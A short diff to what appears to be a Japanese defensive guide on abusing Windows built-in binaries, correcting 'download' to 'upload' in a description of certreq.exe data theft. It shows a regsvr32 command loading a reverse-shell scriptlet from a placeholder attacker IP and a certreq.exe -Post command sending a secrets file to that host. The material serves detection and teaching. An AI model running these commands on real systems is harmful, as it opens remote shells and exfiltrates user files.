@@ -73,7 +73,7 @@ regsvr32.exe /s /u /i:http://<攻撃者IP>:8000/reverse_shell.sct scrobj.dll
 certreq.exe -submit -config "MyCA.local\Corporate-CA" request.inf
 ```
 ### 不審な挙動
-攻撃者に情報をダウンロードする。送信先が外部不明IPだと要注意。
+攻撃者に情報をアップロードする。送信先が外部不明IPだと要注意。
 ```powershell
 certreq.exe -Post -config http://<攻撃者IP>/receive %USERPROFILE%\Documents\secret_list.txt
 ```
